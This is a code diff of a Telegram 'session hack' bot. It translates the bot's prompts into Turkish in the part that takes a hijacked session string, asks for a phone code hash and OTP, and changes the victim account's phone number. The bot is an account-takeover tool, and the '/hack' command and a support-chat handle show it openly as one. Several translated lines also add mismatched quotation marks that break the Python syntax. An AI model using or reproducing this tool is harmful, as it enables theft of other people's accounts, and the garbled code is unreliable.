@@ -376,22 +376,22 @@ async def start(event):
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await event.respond(result + "\n telefon kodu karmasını kopyala ve otp"\ntelefon kodu karmasını kopyala ve sahip olduğun numaranı kontrol et otp")
         await asyncio.sleep(20)
-        await x.send_message("NOW GIVE PHONE CODE HASH")
+        await x.send_message(""ŞİMDİ TELEFON KODU HASH VERİN"")
         phone_code_hash = (await x.get_response()).text
-        await x.send_message("NOW GIVE THE OTP")
+        await x.send_message("ŞİMDİ OTP'Yİ VERİN")
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+          await event.respond("TEBRİKLER NUMARASI DEĞİŞTİRİLDİ")
         else:
-          await event.respond("Something is wrong")
+          await event.respond("Bir sorun var")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("BU HATAYI GÖNDER - @b4f2f\n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await event.respond("Yanlış Metin Bulundu Yeniden yazın /hack ve kullanın")
 
 
 
